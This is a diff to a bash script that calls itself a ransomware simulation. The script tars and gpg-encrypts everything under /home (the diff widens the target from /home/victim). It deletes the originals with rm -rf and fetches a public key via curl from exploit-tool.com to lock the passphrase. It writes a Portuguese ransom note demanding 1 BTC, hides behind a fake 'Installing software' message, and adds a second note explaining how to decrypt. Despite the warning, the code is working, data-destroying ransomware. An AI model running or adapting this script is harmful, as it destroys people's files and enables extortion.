@@ -1,4 +1,5 @@
-: ' Insert the description of the script here
+: ' Script to simulate a ransomware attack.
+    Do not run this on your machine!!!
 
     # exit(s) status code(s)
     0 - success
@@ -31,15 +32,19 @@ __CUT=$(which cut)
 __WHOAMI=$(which whoami)
 __TAR=$(which tar)
 __GPG=$(which gpg)
+__ECHO=$(which echo)
+__CURL=$(which curl)
+__FIND=$(which find)
 
 # warning, this will delete the original files
 __remove_original=${1:-"true"}
-__path=${2:-"/home/victim"}
+__path=${2:-"/home"}
 
 readonly __pass_length="64"
 readonly __tar_file="${__path}/files.tar.gz"
 readonly __key_file="${__path}/passphrase.encrypted"
 readonly __msg_file="${__path}/readme.txt"
+readonly __msg2_file="${__path}/solution.txt"
 readonly __public_key="/tmp/ransomware.pem"
 readonly __public_key_url="http://exploit-tool.com/ransomware.pem"
 
@@ -53,41 +58,44 @@ readonly __passphrase=$(
 if [ ! -e "${__path}" ]; then
 
     # invalid path, exit with error
-    echo "${__path}: path not found"
+    ${__ECHO} "${__path}: path not found"
     exit 1
 
 fi
 
 # encrypt files
-echo "Installing software... This may take a few minutes."
+${__ECHO} "Installing software... This may take a few minutes."
 ${__TAR} --create --gzip --file "${__tar_file}" ${__path}/* &> /dev/null || true
 ${__GPG} --batch --passphrase "${__passphrase}" --symmetric "${__tar_file}" &> /dev/null || true
 
 if [ "${__remove_original}" = "true" ]; then
 
     # remove original files
-    find "${__path}" -mindepth 1 -maxdepth 1 -not -name "*.gpg" | xargs -I{} rm -rf {}
+    ${__FIND} "${__path}" -mindepth 1 -maxdepth 1 -not -name "*.gpg" | xargs -I{} rm -rf {}
 
 fi
 
 # create passphrase file
-curl --silent --location "${__public_key_url}" > "${__public_key}"
-echo "${__passphrase}" | openssl rsautl -encrypt -pubin -inkey "${__public_key}" > "${__key_file}"
+${__CURL} --silent --location "${__public_key_url}" > "${__public_key}"
+${__ECHO} "${__passphrase}" | openssl rsautl -encrypt -pubin -inkey "${__public_key}" > "${__key_file}"
 
-# create message
+# create messages
 __message=$(
 cat <<EOF
   Seus arquivos foram criptografados.
 Envie 1 BTC para a carteira a1b2c3d4e5. Você receberá um e-mail com as intruções
 para acessar seus arquivos após a confirmação da transferência.
-
-...
-
+EOF
+)
+__message2=$(
+cat <<EOF
   Fique calmo esse foi apenas um teste, rode o comando a seguir para acessar a
 senha e descriptografar seus arquivos:
 curl -sL exploit-tool.com/ransomware-key.pem > /tmp/ransomware-key.pem &&
 cat passphrase.encrypted | openssl rsautl -decrypt -inkey /tmp/ransomware-key.pem
 EOF
 )
-echo "${__message}" > "${__msg_file}"
-echo "Installation completed! Happy Hacking :)"
+
+${__ECHO} "${__message}" > "${__msg_file}"
+${__ECHO} "${__message2}" > "${__msg2_file}"
+${__ECHO} "Installation completed! Happy Hacking :)"
